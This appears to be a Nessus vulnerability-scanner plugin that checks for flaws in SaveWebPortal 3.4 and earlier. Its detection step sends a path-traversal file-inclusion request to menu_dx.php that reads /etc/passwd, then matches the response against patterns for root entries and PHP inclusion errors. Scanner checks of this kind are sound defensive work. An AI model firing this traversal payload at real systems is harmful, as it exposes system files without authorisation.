#
# (C) Tenable Network Security
#



include("compat.inc");

if (description) {
  script_id(19604);
  script_version("$Revision: 1.7 $");

  script_bugtraq_id(14639, 14641, 14642, 14643);

  name["english"] = "SaveWebPortal <= 3.4 Multiple Vulnerabilities";
  script_name(english:name["english"]);

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple flaws." );
 script_set_attribute(attribute:"description", value:
"The remote host is running SaveWebPortal, a PHP web portal
application. 

The installed version of SaveWebPortal is prone to multiple
vulnerabilities, including remote code execution, arbitrary file
inclusion, and cross-site scripting." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/save_yourself_from_savewebportal34.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  summary["english"] = "Checks for SaveWebportal arbitrary file inclusion";
  script_summary(english:summary["english"]);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


 # Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit one of the flaws to read /etc/passwd.
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/menu_dx.php?",
      "SITE_Path=../../../../../../../../../../etc/passwd%00" ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning.*: *main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning.*: .+ Failed opening '/etc/passwd.+for inclusion")
  ) {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      report = string(
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = NULL;

    security_hole(port:port, extra:report);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
